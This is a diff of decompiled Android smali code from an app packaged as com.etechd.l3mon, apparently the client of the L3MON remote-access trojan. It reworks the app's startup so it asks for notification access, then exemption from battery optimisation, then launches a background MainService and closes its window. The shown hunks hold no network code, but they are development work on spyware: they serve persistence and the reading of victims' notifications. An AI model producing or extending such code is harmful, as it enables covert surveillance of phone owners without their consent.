@@ -205,7 +205,7 @@
     goto :goto_0
 
     :cond_0
-    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkSpecialPermissionsAndFinish()V
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkNotificationAndContinue()V
 
     :goto_0
     return-void
@@ -214,11 +214,11 @@
 .method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
     .locals 0
 
-    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkSpecialPermissionsAndFinish()V
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkNotificationAndContinue()V
     return-void
 .end method
 
-.method private checkSpecialPermissionsAndFinish()V
+.method private checkNotificationAndContinue()V
     .locals 3
 
     :try_start_0
@@ -237,6 +237,13 @@
 
     :catch_0
     :cond_battery
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkBatteryAndFinish()V
+    return-void
+.end method
+
+.method private checkBatteryAndFinish()V
+    .locals 1
+
     :try_start_1
     invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->requestBatteryOptimization()Z
     move-result v0
@@ -247,6 +254,13 @@
 
     :catch_1
     :cond_finish
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->startServiceAndFinish()V
+    return-void
+.end method
+
+.method private startServiceAndFinish()V
+    .locals 2
+
     new-instance v0, Landroid/content/Intent;
     const-class v1, Lcom/etechd/l3mon/MainService;
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
@@ -260,6 +274,19 @@
     .locals 0
 
     invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V
-    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkSpecialPermissionsAndFinish()V
+
+    const/16 p2, 0x3e9
+    if-ne p1, p2, :cond_check_battery
+
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkBatteryAndFinish()V
+    return-void
+
+    :cond_check_battery
+    const/16 p2, 0x3ea
+    if-ne p1, p2, :cond_return
+
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->startServiceAndFinish()V
+
+    :cond_return
     return-void
 .end method
